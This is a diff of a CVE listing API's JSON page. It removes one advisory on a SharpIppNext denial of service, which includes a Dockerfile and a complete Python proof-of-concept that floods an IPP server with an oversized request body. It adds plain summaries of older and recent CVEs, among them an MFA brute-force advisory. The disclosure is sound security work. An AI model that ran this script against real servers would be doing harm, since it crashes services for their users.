@@ -6,469 +6,690 @@
     "page": 287,
     "pageSize": 50,
     "totalPages": 287,
-    "totalItems": 14320,
+    "totalItems": 14335,
     "hasNextPage": false,
     "hasPrevPage": true
   },
   "cves": [
     {
-      "id": "CVE-2026-59975",
-      "summary": "### Summary\n\nSharpIppNext's `IppProtocol.ReadIppRequestAsync()` unconditionally copies the entire attacker-supplied IPP document payload into an unbounded `MemoryStream` with no size limit. Because this behavior is enabled by default (`ReadDocumentStream = true`) and the official server documentation shows `HttpContext.Request.Body` being passed directly to `ReceiveRequestAsync()` without authentication, an unauthenticated remote attacker can exhaust the server process's memory by sending an arbitrarily large IPP request body, causing an Out-Of-Memory (OOM) condition and denial of service.\n\n> [!NOTE]\n> This vulnerability only affects server-side implementations (using `SharpIppServer` to parse incoming IPP requests). It does not affect client-side implementations using `SharpIppClient` or client-side request construction.\n\n### Details\n\nThe vulnerable sink is in `SharpIpp/Protocol/IppProtocol.cs`:\n\n```csharp\n// IppProtocol.cs:39 — enabled by default\npublic bool ReadDocumentStream { get; set; } = true;\n\n// IppProtocol.cs:466–470 — no size cap on the copy\nif (ReadDocumentStream)\n{\n    message.Document = new MemoryStream();\n    await reader.BaseStream.CopyToAsync(message.Document);  // unbounded\n    message.Document.Seek(0, SeekOrigin.Begin);\n}\n```\n\nThe full call chain from the public API to the vulnerable sink:\n\n1. `docs/Content/Server/index.md:6–11` — Official server example passes `context.Request.Body` (unauthenticated) to `sharpIppServer.ReceiveRequestAsync(inputStream)`.\n2. `SharpIpp/ISharpIppServer.cs:78` — Public API declaration: `Task<IIppRequest> ReceiveRequestAsync(Stream stream, ...)`.\n3. `SharpIpp/SharpIppServer.cs:62–67` — `ReceiveRequestAsync(Stream)` overload delegates to `ReceiveRawRequestAsync(stream)`.\n4. `SharpIpp/SharpIppServer.cs:52–58` — `ReceiveRawRequestAsync` calls `_ippProtocol.ReadIppRequestAsync(stream, ...)`.\n5. `SharpIpp/Protocol/IppProtocol.cs:466–470` — `ReadIppRequestAsync` copies all remaining bytes after the IPP attribute section into a `new MemoryStream()` with no upper bound.\n\nThe existing validator (`IppRequestMessageValidator.ValidateStringLengthLimitsRule`, `IppRequestMessageValidator.cs:260`) only checks IPP attribute string/octet lengths after parsing; it does not constrain the document stream buffered at step 5.\n\nDynamic confirmation (Phase 2): a Docker-based PoC server built directly from the v4.0.2 source (commit `185343e`) was sent a 100 MB IPP document payload. The server responded `docLength=104857600`, confirming all 100 MB were buffered into a `MemoryStream` with no rejection.\n\n### PoC\n\n**1. Build and start the vulnerable server**\n\n```bash\n# From the repository root (build context: parent of vuln-001/)\ndocker build -t sharpipp-dos-poc -f vuln-001/Dockerfile \\\n  reports/pypiAi_973_danielklecha__SharpIppNext/\n\ndocker run --rm -d -p 8631:8631 --name sharpipp-dos-server sharpipp-dos-poc\n```\n\nThe PoC server (`Program.cs`) uses the default `SharpIppServer` (which uses `IppProtocol` with `ReadDocumentStream = true`) and exposes a single unauthenticated POST endpoint:\n\n```csharp\nusing SharpIpp;\n\nvar server = new SharpIppServer();\nvar app = WebApplication.Create();\n\napp.MapPost(\"/\", async ctx =>\n{\n    var req = await server.ReceiveRawRequestAsync(ctx.Request.Body);\n    ctx.Response.ContentType = \"text/plain\";\n    await ctx.Response.WriteAsync($\"docLength={req.Document?.Length}\\n\");\n});\n\napp.Run(\"http://0.0.0.0:8631\");\n```\n\n**2. Send the crafted IPP request**\n\n```bash\npython3 vuln-001/poc.py 127.0.0.1 8631 100\n```\n\nThe PoC script (`poc.py`) builds a minimal valid IPP/2.0 Print-Job request (version + operation-id + request-id + operation-attributes-tag + two mandatory attributes + end-of-attributes-tag) followed by an attacker-controlled document body of the requested size, then sends it over HTTP.\n\n**3. Expected output**\n\n```\n[*] Target          : http://127.0.0.1:8631/\n[*] IPP header size : 72 bytes\n[*] Document payload: 100 MB (104,857,600 bytes)\n[*] Total request   : 104,857,672 bytes\n\n[*] Sending request...\n[*] HTTP status : 200\n[*] Response    : docLength=104857600\n\n[PASS] CONFIRMED: server buffered 104,857,600 bytes (100 MB) into MemoryStream with NO size limit.\n[PASS] Vulnerable sink: IppProtocol.cs:469 reader.BaseStream.CopyToAsync(message.Document)\n```\n\nIncreasing `doc_size_mb` (e.g., to 4096 or beyond available RAM) triggers process-level OOM on the target server.\n\n**Recommended fix**\n\nAdd a configurable maximum document size and throw `client-error-request-entity-too-large` when exceeded:\n\n```diff\na/SharpIpp/Protocol/IppProtocol.cs\n+++ b/SharpIpp/Protocol/IppProtocol.cs\n+        public long? MaxDocumentStreamBytes { get; set; } = 128L * 1024 * 1024;\n\n             if (ReadDocumentStream)\n             {\n                 message.Document = new MemoryStream();\n-                await reader.BaseStream.CopyToAsync(message.Document);\n+                await CopyDocumentStreamAsync(reader.BaseStream, message.Document,\n+                    message, MaxDocumentStreamBytes, cancellationToken).ConfigureAwait(false);\n                 message.Document.Seek(0, SeekOrigin.Begin);\n             }\n```\n\n### Impact\n\nThis is an unauthenticated network-reachable Denial of Service vulnerability. Any server that follows the official SharpIppNext documentation and passes an HTTP request body to `ReceiveRequestAsync()` or `ReceiveRawRequestAsync()` is vulnerable out of the box, because `ReadDocumentStream` defaults to `true` and no document size limit exists in the library.\n\nAn attacker with network access to the IPP endpoint can:\n\n- Send a single HTTP POST request with an arbitrarily large body to exhaust the server process's heap memory.\n- Trigger an OOM kill or `OutOfMemoryException`, crashing the ASP.NET host process and making the printer/IPP service unavailable.\n- Repeat the attack trivially since no authentication is required and the exploit requires only a standard HTTP client.\n\nOnly consumers of SharpIppNext that expose an IPP server endpoint using `SharpIppServer` (e.g., print servers, document management systems, and IoT firmware) are affected. **Applications acting purely as clients (`SharpIppClient`) to query printers or submit jobs are not affected.**\n\n### Reproduction artifacts\n\n#### `Dockerfile`\n\n```dockerfile\n# syntax=docker/dockerfile:1\n# PoC Dockerfile for VULN-001: Unbounded IPP Document Stream Buffering DoS\n#\n# Vulnerability: SharpIppNext v4.0.2 (commit 185343e) buffers the entire\n# attacker-supplied IPP document payload into an unbounded MemoryStream.\n#\n# Affected code (IppProtocol.cs:39, 466-470):\n#   public bool ReadDocumentStream { get; set; } = true;\n#   ...\n#   message.Document = new MemoryStream();\n#   await reader.BaseStream.CopyToAsync(message.Document); // no size limit\n#\n# Build context: the parent directory (pypiAi_973_danielklecha__SharpIppNext/)\n#   docker build -t sharpipp-dos-poc \\\n#     -f vuln-001/Dockerfile .\n#\n# Usage:\n#   docker run --rm -d -p 8631:8631 --name sharpipp-dos sharpipp-dos-poc\n#   python3 vuln-001/poc.py\n\n# ---------------------------------------------------------------------------\n# Build stage: compile the PoC server against the vulnerable SharpIpp library\n# ---------------------------------------------------------------------------\nFROM mcr.microsoft.com/dotnet/sdk:10.0 AS build\n\n# Set up the vulnerable library build environment\nWORKDIR /lib\n\n# Create a minimal Directory.Build.props so SharpIpp.csproj can be compiled\n# without TreatWarningsAsErrors (build toolchain compatibility)\nRUN printf '<Project>\\n  <PropertyGroup>\\n    <Nullable>enable</Nullable>\\n    <LangVersion>latest</LangVersion>\\n    <NoWarn>$(NoWarn);618;612;NETSDK1138</NoWarn>\\n  </PropertyGroup>\\n</Project>\\n' > Directory.Build.props\n\n# Copy central package versions (required by SharpIpp netstandard2.0 target)\nCOPY repo/Directory.Packages.props ./\n\n# Copy the vulnerable SharpIppNext source code (v4.0.2, commit 185343e)\n# IMPORTANT: source is copied unmodified; only the build config above is custom\nCOPY repo/SharpIpp/ ./SharpIpp/\n\n# Set up and build the PoC web server\nWORKDIR /app/server\nCOPY vuln-001/server/ ./\n\nRUN dotnet restore server.csproj\nRUN dotnet publish server.csproj -c Release -o /published\n\n# ---------------------------------------------------------------------------\n# Runtime stage: minimal ASP.NET 10 image\n# ---------------------------------------------------------------------------\nFROM mcr.microsoft.com/dotnet/aspnet:10.0\n\nWORKDIR /app\nCOPY --from=build /published ./\n\nEXPOSE 8631\nENTRYPOINT [\"dotnet\", \"server.dll\"]\n```\n\n#### `poc.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC for VULN-001: Unbounded IPP Document Stream Buffering DoS\nCVE candidate: SharpIppNext v4.0.1/v4.0.2 (CWE-400, CVSS 7.5)\n\nVulnerability: IppProtocol.ReadIppRequestAsync() copies the entire attacker-\ncontrolled IPP document payload into a MemoryStream with no size limit:\n\n    if (ReadDocumentStream)   // default: true\n    {\n        message.Document = new MemoryStream();\n        await reader.BaseStream.CopyToAsync(message.Document);  // NO limit\n        message.Document.Seek(0, SeekOrigin.Begin);\n    }\n\nAn unauthenticated attacker sends a valid IPP header followed by an arbitrarily\nlarge document body. The server buffers all bytes in memory, leading to OOM.\n\nUsage:\n    python3 poc.py [host] [port] [doc_size_mb]\n\n    host         Target host (default: 127.0.0.1)\n    port         Target port (default: 8631)\n    doc_size_mb  Document payload size in MB (default: 100)\n\nExpected result:\n    Server responds with \"docLength=<N>\" where N equals doc_size_mb * 1024^2.\n    This confirms all bytes were buffered into MemoryStream with no size check.\n\"\"\"\n\nimport sys\nimport struct\nimport http.client\nimport time\n\ndef build_ipp_attr(tag: int, name: bytes, value: bytes) -> bytes:\n    \"\"\"Encode a single IPP attribute.\"\"\"\n    return (\n        bytes([tag])\n        + struct.pack(\">H\", len(name))\n        + name\n        + struct.pack(\">H\", len(value))\n        + value\n    )\n\ndef build_ipp_request(doc_size_bytes: int) -> bytes:\n    \"\"\"\n    Build a minimal valid IPP/2.0 Print-Job request.\n\n    Wire format:\n        [2]  version-number     0x0200  (IPP 2.0)\n        [2]  operation-id      0x0002  (Print-Job)\n        [4]  request-id        0x00000001\n        [1]  delimiter         0x01    (operation-attributes-tag)\n        [N]  attributes        attributes-charset + attributes-natural-language\n        [1]  delimiter         0x03    (end-of-attributes-tag)\n        [M]  document-data     <arbitrary payload — the attack surface>\n    \"\"\"\n    # IPP header: version 2.0, Print-Job, request-id 1\n    header = struct.pack(\">HHI\", 0x0200, 0x0002, 0x00000001)\n\n    # Operation attributes group\n    attrs = bytes([0x01])  # operation-attributes-tag\n    attrs += build_ipp_attr(0x47, b\"attributes-charset\", b\"utf-8\")\n    attrs += build_ipp_attr(0x48, b\"attributes-natural-language\", b\"en\")\n    attrs += bytes([0x03])  # end-of-attributes-tag\n\n    # Document payload: attacker-controlled bytes after end-of-attributes\n    # CopyToAsync will buffer ALL of these into a MemoryStream\n    document = b\"X\" * doc_size_bytes\n\n    return header + attrs + document\n\ndef run_poc(host: str, port: int, doc_size_mb: int) -> bool:\n    \"\"\"\n    Send the crafted IPP request and verify the server echoes the full docLength.\n\n    Returns True (PASS) if the server confirms unbounded buffering.\n    \"\"\"\n    doc_size_bytes = doc_size_mb * 1024 * 1024\n    payload = build_ipp_request(doc_size_bytes)\n\n    ipp_header_len = len(payload) - doc_size_bytes\n    print(f\"[*] Target          : http://{host}:{port}/\")\n    print(f\"[*] IPP header size : {ipp_header_len} bytes\")\n    print(f\"[*] Document payload: {doc_size_mb} MB ({doc_size_bytes:,} bytes)\")\n    print(f\"[*] Total request   : {len(payload):,} bytes\")\n    print(f\"[*] Expected docLength in response: {doc_size_bytes}\")\n    print()\n\n    print(f\"[*] Sending request...\")\n    t0 = time.time()\n    try:\n        conn = http.client.HTTPConnection(host, port, timeout=180)\n        conn.request(\n            \"POST\",\n            \"/\",\n            body=payload,\n            headers={\n                \"Content-Type\": \"application/ipp\",\n                \"Content-Length\": str(len(payload)),\n            },\n        )\n        response = conn.getresponse()\n        body = response.read().decode(\"utf-8\", errors=\"replace\").strip()\n        elapsed = time.time() - t0\n    except Exception as exc:\n        print(f\"[FAIL] Connection error: {exc}\")\n        return False\n\n    print(f\"[*] HTTP status : {response.status}\")\n    print(f\"[*] Response    : {body}\")\n    print(f\"[*] Round-trip  : {elapsed:.2f}s\")\n    print()\n\n    expected = f\"docLength={doc_size_bytes}\"\n    if expected in body:\n        print(\n            f\"[PASS] CONFIRMED: server buffered {doc_size_bytes:,} bytes ({doc_size_mb} MB) \"\n            f\"into MemoryStream with NO size limit.\"\n        )\n        print(\n            f\"[PASS] Vulnerable sink: IppProtocol.cs:469 \"\n            f\"reader.BaseStream.CopyToAsync(message.Document)\"\n        )\n        return True\n    else:\n        print(f\"[FAIL] Expected '{expected}' in response, got: {body!r}\")\n        return False\n\ndef main() -> None:\n    host = sys.argv[1] if len(sys.argv) > 1 else \"127.0.0.1\"\n    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8631\n    doc_size_mb = int(sys.argv[3]) if len(sys.argv) > 3 else 100\n\n    success = run_poc(host, port, doc_size_mb)\n    sys.exit(0 if success else 1)\n\nif __name__ == \"__main__\":\n    main()\n```",
+      "id": "CVE-2004-1918",
+      "summary": "RSniff 1.0 allows remote attackers to cause a denial of service (connection exhaustion) via a large number of connections with a command other than AUTHENTICATE, or without any data, which prevents the socket from being closed properly.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-04-09",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://aluigi.altervista.org/adv/rsniff-adv.txt",
+        "http://marc.info/?l=bugtraq&m=108152508004665&w=2",
+        "http://secunia.com/advisories/11339",
+        "http://www.securityfocus.com/bid/10093",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15823"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0202",
+      "summary": "IDirectPlay4 Application Programming Interface (API) of Microsoft DirectPlay 7.0a thru 9.0b, as used in Windows Server 2003 and earlier allows remote attackers to cause a denial of service (application crash) via a malformed packet.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-08-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://secunia.com/advisories/11802",
+        "http://www.osvdb.org/6742",
+        "http://www.securityfocus.com/bid/10487",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2004/ms04-016",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16306"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0162",
+      "summary": "WinCE 3.0.9348 generates predictable TCP Initial Sequence Numbers (ISNs), which allows remote attackers to spoof or hijack TCP connections.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
+      "published": "2001-01-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.cs.jhu.edu/~seny/pubs/wince802.pdf",
+        "http://www.cs.jhu.edu/~seny/pubs/wince802.pdf"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0163",
+      "summary": "Cisco AP340 base station produces predictable TCP Initial Sequence Numbers (ISNs), which allows remote attackers to spoof or hijack TCP connections.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2001-01-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.cs.jhu.edu/~seny/pubs/wince802.pdf",
+        "http://www.cs.jhu.edu/~seny/pubs/wince802.pdf"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0175",
+      "summary": "SGI IRIX before 6.5.21 allows local users to cause a denial of service (kernel panic) via a certain call to the PIOCSWATCH ioctl.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2004-02-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://patches.sgi.com/support/free/security/advisories/20030603-01-P",
+        "http://www.kb.cert.org/vuls/id/142228",
+        "http://www.securityfocus.com/bid/7868",
+        "http://www.securitytracker.com/id?1008770",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/12241"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0368",
+      "summary": "Nokia Gateway GPRS support node (GGSN) allows remote attackers to cause a denial of service (kernel panic) via a malformed IP packet with a 0xFF TCP option.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-02-03",
+      "modified": null,
+      "cwe": "CWE-20",
+      "references": [
+        "http://www.atstake.com/research/advisories/2003/a060903-1.txt",
+        "http://www.kb.cert.org/vuls/id/924812",
+        "http://www.securityfocus.com/bid/7854",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/12221",
+        "http://www.atstake.com/research/advisories/2003/a060903-1.txt"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0814",
+      "summary": "Internet Explorer 6 SP1 and earlier allows remote attackers to bypass zone restrictions and execute Javascript by setting the window's \"href\" to the malicious Javascript, then calling execCommand(\"Refresh\") to refresh the page, aka BodyRefreshLoadsJPU or the \"ExecCommand Cross Domain\" vulnerability.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-02-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://secunia.com/advisories/10192",
+        "http://securitytracker.com/id?1007687",
+        "http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2003-09/0177.html",
+        "http://www.kb.cert.org/vuls/id/326412",
+        "http://www.safecenter.net/liudieyu/BodyRefreshLoadsJPU/BodyRefreshLoadsJPU-Content.htm"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0815",
+      "summary": "Internet Explorer 6 SP1 and earlier allows remote attackers to bypass zone restrictions and read arbitrary files by (1) modifying the createTextRange method and using CreateLink, as demonstrated using LinkillerSaveRef, LinkillerJPU, and Linkiller, or (2) modifying the createRange method and using the FIND dialog to select text, as demonstrated using Findeath, aka the \"Function Pointer Override Cross Domain\" vulnerability.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-02-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=106321757619047&w=2",
+        "http://marc.info/?l=bugtraq&m=106322542104656&w=2",
+        "http://secunia.com/advisories/10192",
+        "http://securitytracker.com/id?1007687",
+        "http://www.ciac.org/ciac/bulletins/o-021.shtml"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0816",
+      "summary": "Internet Explorer 6 SP1 and earlier allows remote attackers to bypass zone restrictions by (1) using the NavigateAndFind method to load a file: URL containing Javascript, as demonstrated by NAFfileJPU, (2) using the window.open method to load a file: URL containing Javascript, as demonstrated using WsOpenFileJPU, (3) setting the href property in the base tag for the _search window, as demonstrated using WsBASEjpu, (4) loading the search window into an Iframe, as demonstrated using WsFakeSrc, (5) caching a javascript: URL in the browser history, then accessing that URL in the same frame as the target domain, as demonstrated using WsOpenJpuInHistory, NAFjpuInHistory, BackMyParent, BackMyParent2, and RefBack, aka the \"Script URLs Cross Domain\" vulnerability.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-02-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=106321638416884&w=2",
+        "http://marc.info/?l=bugtraq&m=106321693517858&w=2",
+        "http://marc.info/?l=bugtraq&m=106321781819727&w=2",
+        "http://marc.info/?l=bugtraq&m=106321882821788&w=2",
+        "http://marc.info/?l=bugtraq&m=106322063729496&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0817",
+      "summary": "Internet Explorer 5.01 through 6 SP1 allows remote attackers to bypass zone restrictions and read arbitrary files via an XML object.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-02-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://secunia.com/advisories/10192",
+        "http://www.securityfocus.com/bid/9012",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-048",
+        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A508",
+        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A520"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0823",
+      "summary": "Internet Explorer 6 SP1 and earlier allows remote attackers to direct drag and drop behaviors and other mouse click actions to other windows by calling the window.moveBy method, aka HijackClick, a different vulnerability than CVE-2003-1027.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-02-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=106322197932006&w=2",
+        "http://secunia.com/advisories/10192",
+        "http://www.kb.cert.org/vuls/id/413886",
+        "http://www.securityfocus.com/archive/1/337086",
+        "http://www.securitytracker.com/id?1006036"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0902",
+      "summary": "Unknown vulnerability in minimalist mailing list manager 2.4, 2.2, and possibly other versions, allows remote attackers to execute arbitrary commands.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-02-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.debian.org/security/2003/dsa-402",
+        "http://www.debian.org/security/2003/dsa-402"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-96339",
+      "summary": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Houzez.co Houzez houzez allows Reflected XSS.This issue affects Houzez: from n/a through 4.4.0.",
+      "cvssScore": 6,
+      "severity": "Medium",
+      "published": "2026-10-16",
+      "modified": "2026-10-16",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-96339",
+        "https://patchstack.com/database/wordpress/theme/houzez/vulnerability/wordpress-houzez-theme-4-4-0-cross-site-scripting-xss-vulnerability?_s_id=cve"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-94388",
+      "summary": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in halfdata Green Popups halfdata-green-popups allows Blind SQL Injection.This issue affects Green Popups: from n/a before 7.6.3.",
+      "cvssScore": 7.1,
+      "severity": "High",
+      "published": "2026-10-16",
+      "modified": "2026-10-16",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-94388",
+        "https://patchstack.com/database/wordpress/plugin/halfdata-green-popups/vulnerability/wordpress-green-popups-plugin-7-6-3-sql-injection-vulnerability?_s_id=cve"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-92427",
+      "summary": "The Coinsnap Bitcoin Crowdfunding WordPress plugin through 1.2.0 does not restrict access to the secret used to authenticate its payment gateway webhook, disclosing it to unauthenticated users and rendering the webhook's signature check ineffective. This allows unauthenticated attackers to forge payment-confirmation notifications and record arbitrary donations as completed, with attacker-chosen amounts, donor names and messages.",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "2026-10-16",
+      "modified": "2026-10-16",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-92427",
+        "https://wpscan.com/vulnerability/a5320c81-5ad9-471d-9c58-726b585b801e"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1135",
+      "summary": "Buffer overflow in Yahoo! Messenger 5.6 allows remote attackers to cause a denial of service (crash) via a file send request (sendfile) with a large number of \"%\" (percent) characters after the Yahoo ID.",
+      "cvssScore": 2.6,
+      "severity": "Low",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/342472",
+        "http://www.securityfocus.com/bid/8894",
+        "http://www.securityfocus.com/archive/1/342472",
+        "http://www.securityfocus.com/bid/8894"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1147",
+      "summary": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: CVE-2003-0955.  Reason: This candidate is a duplicate of CVE-2003-0955.  Notes: All CVE users should reference CVE-2003-0955 instead of this candidate.  All references and descriptions in this candidate have been removed to prevent accidental usage",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-77608",
+      "summary": "#### Failure mode\n\nThe `value` parameter was reflected back into rendered output and error messaging paths without enough output-context encoding.\n\n#### Remediation\n\n- The form value is escaped before it is placed back into the input field.\n- Derived error messages are also escaped before being rendered into HTML.\n\n#### Maintenance note\n\nDo not treat error text as trusted just because it originated from validation. Validation output can still be attacker-influenced.",
+      "cvssScore": 6.1,
+      "severity": "Medium",
+      "published": "2026-09-18",
+      "modified": "2026-09-18",
+      "cwe": {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      },
+      "references": [
+        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-59xw-qv23-j3rc",
+        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/releases/tag/7.2.0",
+        "https://github.com/advisories/GHSA-59xw-qv23-j3rc"
+      ],
+      "vulnerableProducts": [
+        "mediawiki/semantic-media-wiki composer"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1495",
+      "summary": "The Repair Archive command in WinRAR 3.40 allows remote attackers to cause a denial of service (application crash) via a corrupt ZIP archive.",
+      "cvssScore": 2.6,
+      "severity": "Low",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=109941351432699&w=2",
+        "http://secunia.com/advisories/13070",
+        "http://www.rarlabs.com/rarnew.htm",
+        "http://www.securityfocus.com/bid/11581",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17937"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1496",
+      "summary": "Directory traversal vulnerability in Web Forums Server 1.6 and 2.0 Power Pack allows remote attackers to read arbitrary files via a URL containing (1) \"..\\\" (dot dot backslash), (2) \"../\" (dot dot slash), (3) \"/%2E%2E%5C\" (encoded dot dot backslash), or (4) \"%2E%2E%2F\" (encoded dot dot slash).",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=109943267328552&w=2",
+        "http://marc.info/?l=bugtraq&m=109943267328552&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-115463",
+      "summary": "### Summary\n\nThe email second factor is an mt_rand() six-digit code verified with no attempt limit or lockout\n\nThe email second factor is a six-digit code drawn from `mt_rand()` and verified with no attempt limit, so an attacker who already has the password can brute-force it inside its validity window.\n\n`lib/Domain/Service/MfaService.php`, in `generateEmailVerificationCode()`:\n\n```php\n$numericCode = mt_rand(100000, 999999);\n```\n\nThat is a 900,000-value space, and `mt_rand()` is a Mersenne Twister rather than a CSPRNG, so it is not appropriate for a security token in the first place. PHP provides `random_int()` for exactly this.\n\nThe bigger problem is that nothing limits guesses. `lib/Application/Controller/MfaVerifyController.php` calls:\n\n```php\n$isValid = $this->mfaService->verifyCode($userId, $code);\n```\n\nand on failure the only action taken is:\n\n```php\n$this->logger->warning('[MfaVerifyController] Verification failed for user ID: {user_id}', ['user_id' => $userId]);\n```\n\nI grepped that controller for any counter, lockout, throttle or rate limit and found nothing beyond log statements. So an attacker holding valid credentials submits codes until one lands. Against 900,000 values with no ceiling on attempts, the only thing standing in the way is the code's validity window and however fast requests can be issued.\n\nThat defeats the purpose of the second factor: it is meant to hold even when the password is known, and here it reduces to a race the attacker is likely to win with sustained requests.\n\nTwo separate fixes, and I would treat the second as the urgent one:\n\n1. Generate the code with `random_int(100000, 999999)` so it is not predictable from RNG state.\n2. Enforce a failed-attempt counter tied to the user and the pending MFA session, invalidating the code and requiring a fresh one after a small number of wrong guesses, plus a per-account and per-IP rate limit on the verify endpoint.\n\nScope: source-verified at `master`. I confirmed the generator, the verify call site, the log-only failure handling and the absence of any throttling construct in that controller. I did not stand up a Poweradmin instance and run a brute-force against a live code, so the rate at which the space can be covered in practice is not something I measured. If throttling is applied at a layer I did not look at, such as a web-server or reverse-proxy rule shipped with your deployment docs, then the second half of this weakens considerably and I would want to know that.\n\nI used AI assistance while reading the code and preparing this report.\n\nConfirmed, and thanks for the detail. I've widened the affected range: this reaches back to 4.0.0, where MFA was first added, and 4.4.0 still ships it, so the original <= 4.3.4 was too narrow. The 3.x line has no MFA at all and is unaffected. Fixes are in for 4.2.x, 4.3.x, 4.4.x and the development branch.\n\nTo answer your question about other layers, there is nothing. No middleware runs in front of that controller, so what you found missing in the controller is the whole picture.\n\nI've adjusted the score down from 9.1 to 7.4. Walking 900,000 values inside the code's ten minute life needs sustained request rates, and MFA is off by default, so there are real preconditions beyond knowing the password. It is still a second factor that does not hold, which is the point of the report.\n\nThe mt_rand swap is in as well, though I would treat that as hardening rather than the bug. Recovering the generator state from these codes is not practical in this setup. The missing attempt limit was the actual problem.",
+      "cvssScore": 7.4,
+      "severity": "High",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
+      "cwe": {
+        "cwe_id": "CWE-307",
+        "name": "Improper Restriction of Excessive Authentication Attempts"
+      },
+      "references": [
+        "https://github.com/poweradmin/poweradmin/security/advisories/GHSA-9657-8vc2-7g2p",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-115463",
+        "https://github.com/poweradmin/poweradmin/commit/021e5fea029cf8787247517cde752f9a6af1647c",
+        "https://github.com/poweradmin/poweradmin/commit/541e31fec32f0eae0d93a13de125a06ee19ecd92",
